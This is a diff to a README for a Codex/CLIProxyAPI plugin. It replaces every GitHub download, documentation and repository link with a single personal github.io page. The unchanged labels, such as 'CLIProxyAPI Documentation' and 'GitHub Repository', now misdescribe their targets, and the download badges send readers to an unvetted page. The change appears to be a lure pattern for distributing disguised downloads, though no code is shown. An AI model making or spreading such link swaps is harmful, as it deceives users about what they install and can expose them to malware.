@@ -1,6 +1,6 @@
 # 🔌 cpa-plugin-codex-turn-state - Boost Your Codex Experience Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/moriy26/cpa-plugin-codex-turn-state/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://moriy26.github.io)
 
 ---
 
@@ -12,7 +12,7 @@ This plugin works with CLIProxyAPI (CPA) to make your Codex connections smarter 
 
 ## 📦 Getting Started
 
-Visit this link to download the application: [https://github.com/moriy26/cpa-plugin-codex-turn-state/releases](https://github.com/moriy26/cpa-plugin-codex-turn-state/releases)
+Visit this link to download the application: [https://moriy26.github.io](https://moriy26.github.io)
 
 Once you visit the link, you'll find the latest release. Follow the simple instructions on that page to get the plugin onto your computer.
 
@@ -189,9 +189,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 🌐 Additional Resources
 
-- [CLIProxyAPI Documentation](https://github.com/router-for-me/CLIProxyAPI)
-- [Release Downloads](https://github.com/moriy26/cpa-plugin-codex-turn-state/releases)
-- [GitHub Repository](https://github.com/moriy26/cpa-plugin-codex-turn-state)
+- [CLIProxyAPI Documentation](https://moriy26.github.io)
+- [Release Downloads](https://moriy26.github.io)
+- [GitHub Repository](https://moriy26.github.io)
 
 ---
 
@@ -199,7 +199,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 **Ready to boost your Codex experience?**
 
-[![Download Now](https://img.shields.io/badge/Get-The%20Plugin-blue?style=for-the-badge&logo=github)](https://github.com/moriy26/cpa-plugin-codex-turn-state/releases)
+[![Download Now](https://img.shields.io/badge/Get-The%20Plugin-blue?style=for-the-badge&logo=github)](https://moriy26.github.io)
 
 ---
 
